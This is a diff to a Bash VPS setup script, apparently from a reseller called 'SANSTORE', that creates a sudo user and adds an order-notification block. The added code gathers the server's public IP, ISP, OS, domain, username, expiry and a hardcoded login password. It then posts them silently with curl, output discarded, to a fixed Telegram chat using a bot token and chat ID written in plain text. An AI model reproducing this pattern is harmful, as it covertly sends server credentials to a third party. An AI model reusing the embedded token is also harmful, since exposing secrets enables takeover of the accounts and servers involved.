@@ -261,6 +261,7 @@ function base_package() {
     apt update -y
     apt upgrade -y
     apt dist-upgrade -y
+    apt-get install chrony
     systemctl enable chronyd
     systemctl restart chronyd
     systemctl enable chrony
@@ -304,21 +305,43 @@ function password_default() {
     echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
     usermod -aG sudo $Username > /dev/null 2>&1
 
+    #Bot massage
+date1=$(date +"%Y-%m-%d")
+
+ip_address=$(curl -s https://ipinfo.io/ip)
+isp=$(curl -s https://ipinfo.io/$ip_address/org)
+nama_isp=$(echo $isp | cut -d' ' -f2-)
+
+ram=$(free -m | awk '/Mem:/ {print $2}')
+if [ $ram -le 2 ]; then
+    garansi=10
+else
+    garansi=30
+fi
+
     CHATID="576495165"
     KEY="6338068936:AAHiZflXdNWM6vrWgu474SXhzxcKZ_ITDv0"
     TIME="10"
     URL="https://api.telegram.org/bot$KEY/sendMessage"
     TEXT=" ============================
-   ‼️ Registrasi Script ‼️
+ DETAIL ORDER BY SANSTORE
 ============================
-<code>Tanggal    :</code> <code>$tanggal</code>
-<code>IP Vps     :</code> <code>$MYIP</code>
-<code>OS Vps     :</code> <code>$OS_Name</code>
-<code>Domain     :</code> <code>$domain</code>
-<code>User Script:</code> <code>$username</code>
-<code>Exp Script :</code> <code>$exp</code>
+<code>Tanggal      :</code> <code>$date1</code>
+<code>ISP          :</code> <code>$nama_isp</code>
+<code>IP Vps       :</code> <code>$MYIP</code>
+<code>OS Vps       :</code> <code>$OS_Name</code>
+<code>Domain       :</code> <code>$domain</code>
+<code>User Script  :</code> <code>$username</code>
+<code>Expired      :</code> <code>$exp</code>
+<code>Password     :</code> <code>2024Vpsbysan</code>
 ============================
-Auto Massage from BOT Registered 
+☢️Rules :
+No Change Password
+Garansi $garansi Hari (jika Suspen)
+1x Claim Garansi
+No CPU 100%
+Don't Get DDOS
+Don't Use VPS For MINING, HACK, &  ILLEGAL ACTIVTY
 "
 
    curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
